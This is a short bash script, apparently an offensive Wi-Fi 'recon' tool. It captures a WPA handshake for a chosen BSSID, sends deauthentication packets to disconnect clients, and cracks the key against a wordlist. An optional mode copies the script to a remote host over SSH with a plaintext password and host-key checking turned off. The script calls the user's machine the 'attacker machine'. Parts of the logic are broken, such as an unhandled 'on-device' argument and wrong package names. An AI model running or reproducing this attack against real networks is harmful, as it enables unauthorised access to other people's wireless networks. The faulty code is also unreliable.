#!/usr/bin/env bash
# wifi_recon.sh
# Adapted with remote-vs-local execution: remote scan vs on-device via SSH
# Usage: ./ wifi_recon.sh
# Requires appropriate tools depending on mode

function detect_os() {
  case "$(uname -s)" in
    Linux*) echo "linux";;
    Darwin*) echo "darwin";;
    *) echo "unknown";;
  esac
}

function ensure_tool() {
  local t=$1
  if ! command -v "$t" &>/dev/null; then
    echo "[!] $t not found, attempting install"
    if [[ "$(detect_os)" == "darwin" ]]; then
      brew install "$t"
    elif [[ "$(detect_os)" == "linux" ]]; then
      sudo apt-get update && sudo apt-get install -y "$t"
    else
      echo "Unsupported OS for install: $t"; exit 1
    fi
  fi
}

function remote_scan() {
  read -rp "Interface: " IFACE
read -rp "BSSID: " BSSID
airodump-ng --bssid "$BSSID" -w capture --channel 6 "$IFACE"
aireplay-ng -0 5 -a "$BSSID" "$IFACE"
aircrack-ng -w wordlist.txt capture-01.cap

}

function remote_ssh_execute() {
  local host="$SSH_HOST"
  local user="$SSH_USER"
  local pass="$SSH_PASS"
  echo "[*] Copying script and executing on-device via SSH"
  scp "$0" "$user@$host:/tmp/wifi_recon.sh"
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$host" "bash /tmp/wifi_recon.sh on-device"
}

# Main
echo "Select mode:"
echo "1) Remote scan from attacker machine"
echo "2) Run on-device via SSH"
read -rp "Choice [1/2]: " MODE

if [[ "$MODE" == "2" ]]; then
  read -rp "SSH host: " SSH_HOST
  read -rp "SSH user: " SSH_USER
  read -rsp "SSH password: " SSH_PASS
  echo
  ensure_tool sshpass
  remote_ssh_execute
  exit 0
else
  # perform remote scan
  ensure_tool airodump-ng
ensure_tool aireplay-ng
ensure_tool aircrack-ng
  remote_scan
  exit 0
fi
